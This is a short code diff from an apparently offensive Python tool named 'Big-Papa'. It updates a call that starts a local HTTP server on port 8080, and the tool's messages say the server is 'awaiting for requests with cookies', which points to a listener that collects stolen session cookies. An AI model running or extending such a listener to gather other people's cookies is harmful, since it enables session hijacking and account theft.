@@ -46,7 +46,7 @@ def shoot():
 			print(golo)
 			print(colored("------<Server Online>-----", "green"))
 			print(colored("[#]Awaiting For Requests with cookies"))
-			subprocess.call("python -m SimpleHTTPServer 8080", shell=True)
+			subprocess.call("python3 -m http.server 8080", shell=True)
 			#starting the python server awaiting for http get requests with cookies.....!
 		except KeyboardInterrupt:
 			ask = input(colored("\n\nDo you want to quit Big-Papa?...Y/N: ", "red", attrs=['bold']))
